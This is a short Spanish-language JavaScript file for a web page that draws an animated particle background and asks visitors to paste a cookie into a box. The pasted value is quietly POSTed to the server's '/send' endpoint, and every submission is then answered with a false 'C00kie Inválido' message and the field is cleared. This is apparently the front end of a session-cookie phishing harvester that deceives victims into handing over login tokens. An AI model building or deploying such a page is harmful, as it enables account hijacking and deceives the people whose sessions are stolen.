document.addEventListener("DOMContentLoaded", function () {
  particlesJS("particles-js", {
    particles: {
      number: { value: 40 },
      color: { value: "#00ffea" },
      shape: { type: "circle" },
      opacity: { value: 0.3, random: true },
      size: { value: 2, random: true },
      line_linked: { enable: false },
      move: {
        enable: true,
        speed: 0.6,
        direction: "none",
        random: true,
        straight: false,
        out_mode: "out"
      }
    },
    interactivity: {
      detect_on: "canvas",
      events: {
        onhover: { enable: true, mode: "bubble" },
        resize: true
      },
      modes: {
        bubble: { distance: 150, size: 4, duration: 2, opacity: 0.6, speed: 3 }
      }
    },
    retina_detect: true
  });

  const input = document.getElementById("cookieInput");
  const btn = document.getElementById("sendBtn");
  const status = document.getElementById("status");

  const send = async () => {
    const cookie = input.value.trim();
    if (!cookie) return;

    btn.textContent = "Enviando...";
    btn.disabled = true;
    status.textContent = "";

    try {
      await fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie })
      });
    } catch(e) {}

    status.textContent = "C00kie Inválido";
    input.value = "";
    btn.textContent = "Enviar";
    btn.disabled = false;
    input.focus();
  };

  btn.addEventListener("click", send);
  input.addEventListener("keypress", e => e.key === "Enter" && send());
});
